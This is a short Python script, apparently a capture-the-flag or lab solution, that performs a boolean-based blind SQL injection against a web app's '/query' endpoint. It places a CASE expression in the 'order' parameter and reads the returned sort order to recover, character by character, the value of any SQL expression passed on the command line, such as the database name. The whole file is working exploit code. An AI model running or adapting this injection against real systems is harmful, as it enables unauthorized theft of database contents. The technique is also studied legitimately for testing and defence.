import requests
import json
import string
import sys

a = string.printable
s = ""
url = sys.argv[1] + "/query"
for i in range(1,100):
    for j in a:
        data = {
            "col1":"item_name",
            "order":f" (case when (ascii(substr({sys.argv[2]},{i},1))={ord(j)}) then item_name else category end)"
            #(case when (ascii(substr(current_database(),0,1))>0) then item_name else category end)
        }
        r=requests.get(url,params=data)
        if json.loads(r.text)[0]["item_name"] == "BBQ Pulled Pork Sandwich":
            print("ok")
            s+=j
            print(s)
            break
        else:
            print(f"[{j}]: Not OK")